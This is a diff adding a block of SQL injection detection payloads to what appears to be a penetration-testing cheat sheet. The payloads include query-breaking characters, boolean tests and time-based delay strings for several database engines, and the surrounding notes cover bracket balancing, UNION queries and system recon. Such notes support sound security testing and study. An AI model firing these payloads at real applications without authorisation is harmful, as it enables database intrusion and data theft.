@@ -24,6 +24,40 @@ Web scanner tools can be used for this purpose for quick and efficient detection
 
 Sometimes we might find that we can escape with `'` but the query needs to be valid so it may need `')` to correctly balance and terminate the brackets (it may need multiple brackets). Then we can comment out the rest of the query and run UNIONS (`')-- `). 
 
+```
+Break Query:
+	'
+	"
+	)
+	')
+	")
+	#
+	--
+	*
+	\
+	\'
+	--'
+
+Boolean Detection:
+	AND 1=1 --
+	AND 1=2 --
+
+Time Detection:
+	'; IF (1=1) WAITFOR DELAY '0:0:10'--
+	' sleep(10) --
+	'|| pg_sleep(10)--
+	'|| dbms_pipe.receive_message(('a'),10)--
+	' or sleep(10)#
+	';waitfor delay '0:0:__TIME__'--
+	1/sleep(10)
+	1-sleep(10)
+	-sleep/*f*/(10)
+	%0a%0d/sleep(3)
+
+Mathematical Operations:
+	1+1
+	3-2
+```
 ## Discovering System Information
 - There is often variables and tables that come as default for many SQL implementations that details the versions and technologies used
 - These are specific to the language but can be very helpful for recon on the target
